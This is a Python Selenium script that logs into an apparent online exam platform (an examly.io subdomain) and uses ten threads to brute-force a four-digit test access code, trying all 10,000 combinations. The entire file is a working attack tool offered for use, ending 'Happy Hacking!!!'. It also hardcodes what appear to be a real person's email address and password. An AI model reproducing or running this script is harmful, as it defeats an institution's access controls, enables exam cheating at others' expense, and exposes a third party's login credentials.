from itertools import product as p
from selenium import webdriver
import time
from webdriver_manager.chrome import ChromeDriverManager
from threading import Thread
import math
import numpy as np


def hack_access_code(possiblities, emailId, password):
    global codeFound, code
    # selenium conncetion
    browser = webdriver.Chrome(ChromeDriverManager().install())
    browser.get("https://saranathan468.examly.io")
    time.sleep(15)

    # reference to the elements
    e = browser.find_element_by_id("emailAddress")
    p = browser.find_element_by_id("password")
    b = browser.find_element_by_class_name("ladda-button")

    # authenticating
    e.send_keys(emailId)
    p.send_keys(password)

    # triggering login button
    b.click()

    time.sleep(15)
    browser.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(5)
    browser.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(5)
    browser.execute_script("window.scrollTo(0, document.body.scrollHeight);")
    time.sleep(15)
    # selecting the test module
    m = browser.find_elements_by_class_name("inprogress")[1]
    m.click()
    # print(m)
    time.sleep(10)
    browser.execute_script("window.scrollTo(0, document.body.scrollHeight);")

    time.sleep(15)

    dd = browser.find_elements_by_class_name("icon-angle-down")[1]
    dd.click()

    time.sleep(10)
    tt = browser.find_elements_by_class_name("btn-button")[0]
    tt.click()

    time.sleep(10)
    inp = browser.find_element_by_class_name("access_key_input")

    for i in possiblities:
        if(codeFound):
            break
        k = "".join(list(map(str, i)))
        print(k)
        key = k+password
        inp.clear()
        inp.send_keys(key)

        print("trying key - ", k)
        bt = browser.find_element_by_class_name("proceed_button")
        bt.click()
        time.sleep(2)
        
        if(len(browser.find_elements_by_class_name("check_list_error")) > 0):
            print("inavild access code")
        else:
            codeFound = True
            code = k
            print("access code found")
            break

    # browser.quit()



if __name__ == "__main__":

    codeFound = False
    code = ''
    print("------Hack the Access Code-----")
    # commons
    emailId = "grthayalan18@gmail.com"
    password = "1018@thayalan"
    noOfThreads = 10
    threadPossiblitiesArr = []
    # global codeFound, code

    # generating keywords
    ran = [i for i in range(10)]
    print(ran)

    print("generating possiblities")
    # generating possiblities
    possiblities = list(p(ran, repeat=4))
    print(len(possiblities))
    threadPossiblitiesArr = np.array_split(possiblities, noOfThreads)
    threads = []
    # threading
    print("Bruteforcing with threading...")
    for i in range(noOfThreads):
        threads.append(Thread(target=hack_access_code, args=(
            threadPossiblitiesArr[i], emailId, password)))

    for i in threads:
        i.start()

    for i in threads:
        i.join()

    print("Access Code obtained....")
    print("code is - " + code)
    print("Happy Hacking!!!")
